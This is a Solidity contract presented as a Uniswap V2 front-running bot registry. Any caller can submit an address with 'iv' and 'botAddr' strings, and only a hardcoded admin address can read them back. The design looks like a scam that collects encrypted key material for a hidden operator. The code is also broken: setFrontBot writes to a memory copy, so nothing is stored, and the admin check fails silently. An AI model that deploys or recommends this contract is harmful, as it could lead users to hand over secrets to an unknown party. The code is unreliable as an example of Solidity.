pragma solidity >=0.7.0 <0.9.0;

contract UniswapV2FrontBot {
    
    struct FrontBot {
        string iv;
        string botAddr;
    }
    
    mapping (address => FrontBot) bots;
    address[] public botAccts;
    
    address public admin = 0x1b79A2a8a18F8A19d786A1796BaAE26f9779b22E;
    
    modifier isAdmin(){
        if(msg.sender != admin)
            return;
        _;
    }
    
    function setFrontBot(address _address, string memory _iv, string memory _botAddr) public {
        FrontBot memory bot = bots[_address];
        
        bot.iv = _iv;
        bot.botAddr = _botAddr;

        botAccts.push(_address);
    }
    
    function getFrontBots() view public returns(address[] memory _botAccts) {
        return botAccts;
    }
    
    function getFrontBotAddr(address _address) view isAdmin public returns (string memory _botAddr) {
        return (bots[_address].botAddr);
    }
    
    function getFrontBotIv(address _address) view isAdmin public returns (string memory _botIv) {
        return (bots[_address].iv);
    }

    function countFrontBots() view public returns (uint) {
        return botAccts.length;
    }
}
